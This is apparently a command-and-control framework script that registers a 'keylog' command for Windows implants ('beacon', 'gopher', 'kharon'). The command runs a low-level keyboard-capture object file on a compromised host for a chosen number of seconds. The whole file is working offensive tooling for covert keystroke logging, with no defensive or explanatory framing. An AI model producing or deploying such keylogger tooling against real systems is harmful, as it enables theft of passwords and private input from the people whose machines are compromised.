// KeyLog-BOF/keylog.axs
var metadata = {
    name: "KeyLog-BOF",
    description: "Low-level keyboard capture BOF"
};

var cmd_keylog = ax.create_command("keylog", "Low-level keyboard capture for N seconds", "keylog -d 300");
cmd_keylog.addArgInt("-d", "duration", "Capture duration in seconds", 300);

cmd_keylog.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let duration = parsed_json["duration"];
    if (!duration || duration <= 0) duration = 300;

    let bof_params = ax.bof_pack("int", [duration]);
    let bof_path = ax.script_dir() + "_bin/keylog." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "BOF implementation: keylog");
});

var b_group_keylog = ax.create_commands_group("KeyLog-BOF", [cmd_keylog]);
ax.register_commands_group(b_group_keylog, ["beacon", "gopher", "kharon"], ["windows"], []);
